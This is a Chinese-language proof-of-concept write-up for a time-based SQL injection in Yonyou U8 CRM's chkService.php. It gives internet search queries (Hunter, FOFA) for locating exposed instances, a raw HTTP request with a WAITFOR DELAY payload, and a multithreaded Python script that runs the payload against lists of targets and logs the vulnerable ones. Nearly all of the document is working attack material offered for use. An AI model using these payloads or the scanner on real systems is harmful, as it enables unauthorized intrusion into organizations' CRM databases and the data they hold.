## hunter

```
app.name="用友 CRM"
```

## fofa

```
title="用友U8CRM"
```

## poc

```
GET /ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=bgsesstimeout-;
Connection: close


```

![image-20240920165741697](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240920165741697.png)

## py脚本

```python
import argparse, requests, sys, re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 定义横幅
def banner():
    banner = """

██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    

                                                    data: 2024-09-20
                                                    version: 1.0.0
                                                    author: hulless-oat
"""
    print(banner)

# 定义主函数
def main():
    # 调用横幅
    banner()
    # argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="用友U8-CRM系统chkService.php存在SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input file path')
    args = parser.parse_args()
    # 如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    # 如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list = []
        with open(args.file, mode='r', encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n', ''))
                # print(url_list)
                # 设置多线程
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    # 如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

# 定义poc
def poc(target):
    payload = '/ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:5%27--'
    url = target + payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Cookie': 'PHPSESSID=bgsesstimeout-;',
        'Connection': 'close',
    }
    try:
        res = requests.get(url=url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200 and 'true' in res.text:
            print(f'[+]{GREEN}该网站存在sql注入漏洞: {target}\n{RESET}')
            with open('result1.txt', mode='a', encoding='utf-8') as fp:
                fp.write(target + '\n')
                return True
        else:
            print(f'该网站不存在sql注入漏洞')
    except:
        print(f'该网站存在问题，请手动测试')

if __name__ == '__main__':
    main()
```

